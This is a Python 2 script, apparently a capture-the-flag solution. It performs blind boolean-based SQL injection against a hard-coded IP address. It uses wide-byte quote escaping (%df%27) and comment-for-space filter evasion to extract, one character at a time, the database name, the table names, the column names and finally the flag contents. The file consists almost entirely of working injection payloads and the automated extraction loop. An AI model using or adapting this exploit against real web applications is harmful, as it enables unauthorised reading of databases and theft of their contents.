# -*- coding:utf-8 -*- 
import requests

url = "http://134.175.147.161:10004/index.php"

s = requests.Session()
right = s.get(url + "?id=1")
#测试爆数据库名
"""

length = 0
print "get the length of database"
wait = "."
for i in range(20):
	post = "?id=1%df%27/**/or/**/length(database())=" + str(i) + "/**/%23"
	test = s.get(url + post)
	if test.text == right.text:
		length = i
		break
	else:
		print "[+]" + wait
		wait += "."
		if len(wait) == 5:
			wait = "."

print "database length is " + str(length)	

result = ""
wait = "."
for i in range(1,length + 1):
	for j in range(48, 127):
		post = "?id=1%df%27/**/or/**/ord(substr(database()," + str(i) + ",1))=" + str(j) + "/**/%23"
		test = s.get(url + post)
		if test.text == right.text:
			result += chr(j)
			print "[+]" + result
			break
		else:
			print "[+]" + result + wait
			wait += "."
			if len(wait) == 5:
				wait = "."
"""
#爆字段名
"""

length = 0
print "get the length of table"
wait = "."
for i in range(30):
	post = "?id=1%df%27/**/or/**/length((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()))=" + str(i) + "/**/%23"
	test = s.get(url + post)
	if test.text == right.text:
		length = i
		break
	else:
		print "[+]" + wait
		wait += "."
		if len(wait) == 5:
			wait = "."

print "database length is " + str(length)	

result = ""
wait = "."
for i in range(1,length + 1):
	for j in range(44, 127):
		post = "?id=1%df%27/**/or/**/ord(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())," + str(i) + ",1))=" + str(j) + "/**/%23"
		test = s.get(url + post)
		if test.text == right.text:
			result += chr(j)
			print "[+]" + result
			break
		else:
			print "[+]" + result + wait
			wait += "."
			if len(wait) == 5:
				wait = "."
"""
#爆字段名
"""
length = 0
print "get the length of columns"
wait = "."
for i in range(30):
	post = "?id=1%df%27/**/or/**/length((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666c3367))=" + str(i) + "/**/%23"
	test = s.get(url + post)
	if test.text == right.text:
		length = i
		break
	else:
		print "[+]" + wait
		wait += "."
		if len(wait) == 5:
			wait = "."

print "database length is " + str(length)	

result = ""
wait = "."
for i in range(1,length + 1):
	for j in range(44, 127):
		post = "?id=1%df%27/**/or/**/ord(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666c3367)," + str(i) + ",1))=" + str(j) + "/**/%23"
		test = s.get(url + post)
		if test.text == right.text:
			result += chr(j)
			print "[+]" + result
			break
		else:
			print "[+]" + result + wait
			wait += "."
			if len(wait) == 5:
				wait = "."
"""
#爆内容
length = 0
print "get the length of flag"
wait = "."
for i in range(50):
	post = "?id=1%df%27/**/or/**/length((select/**/group_concat(fl4g)/**/from/**/fl3g))=" + str(i) + "/**/%23"
	test = s.get(url + post)
	if test.text == right.text:
		length = i
		break
	else:
		print "[+]" + wait
		wait += "."
		if len(wait) == 5:
			wait = "."

print "flag length is " + str(length)	

result = ""
wait = "."
for i in range(1,length + 1):
	for j in range(44, 127):
		post = "?id=1%df%27/**/or/**/ord(substr((select/**/group_concat(fl4g)/**/from/**/fl3g)," + str(i) + ",1))=" + str(j) + "/**/%23"
		test = s.get(url + post)
		if test.text == right.text:
			result += chr(j)
			print "[+]" + result
			break
		else:
			print "[+]" + result + wait
			wait += "."
			if len(wait) == 5:
				wait = "."